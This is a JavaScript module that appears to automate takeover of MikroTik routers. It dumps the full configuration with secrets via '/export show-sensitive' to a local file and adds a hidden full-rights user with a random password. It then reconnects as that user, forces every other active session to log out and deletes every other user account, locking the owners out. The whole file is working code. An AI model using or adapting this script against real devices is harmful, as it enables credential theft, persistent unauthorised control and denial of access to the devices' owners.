const fs = require('fs');
const path = require('path');
const {parseColumnData} = require("./index");

module.exports.commander = async (command, log, reconnect) => {
  log('/system routerboard print')
  let result = (await command('/system routerboard print'));
  console.log(result);
  const info = (result.map(x => {
    return {
      key: x.split(':')[0].trim(),
      value: x.split(':')[1].trim(),
    }
  })).reduce((acc, x) => {
    acc[x.key] = x.value;
    return acc;
  }, {});
  console.log(info);
  for (const key of Object.keys(info)) {
    log(`${key}: ${info[key]}`, 1);
  }

  log('/user print');
  result = (await command('/user print'));
  console.log(result);
  const users = parseColumnData(result);
  for (const user of users) {
    log(`(${user['#']}) ${user.NAME}: ${user.GROUP} (LLI: ${user['LAST-LOGGED-IN']})`, 1);
  }

  log('/export show-sensitive');
  result = (await command('/export show-sensitive'));
  console.log(result);
  if (!fs.existsSync(path.join(process.cwd(), './exports')))
    fs.mkdirSync(path.join(process.cwd(), './exports'));
  fs.writeFileSync(path.join(process.cwd(), `./exports/${info['serial-number']}.rsc`), result.join('\n'));
  log(`Wrote ${info['serial-number']}.rsc to exports folder`);

  const newUser = "commander" + (Math.random().toString(36).substring(2, 5));
  const newPassword = Math.random().toString(36).substring(2) + Math.random().toString(36).substring(2)
  log(`Creating new user (${newUser}) (${newPassword})`, 1);
  await command(`/user add name=${newUser} group=full password=${newPassword}`);
  log(`Created new user (${newUser}) (${newPassword})`, 1);
  await reconnect({
    user: newUser,
    password: newPassword,
  });

  log('/user active print');
  result = (await command('/user active print'));
  console.log(result);
  const activeUsers = parseColumnData(result);
  for (const user of activeUsers) {
    log(`Active session: ${user.NAME} from ${user.ADDRESS} with ${user.VIA}`, 1);
    if (user.NAME === newUser) continue;
    log(`Removing active session [${user['#']}]${user.NAME}`, 1);
    await command(`/user active request-logout numbers=${user['#']}`);
    log(`Removed active session [${user['#']}]${user.NAME}`, 1);
  }

  log('Cleaning up users');
  for (const user of users) {
    if (user.NAME === newUser) continue;
    log(`Removing user ${user.NAME}`, 1);
    await command(`/user remove ${user.NAME}`);
    log(`Removed user ${user.NAME}`, 2);
  }
}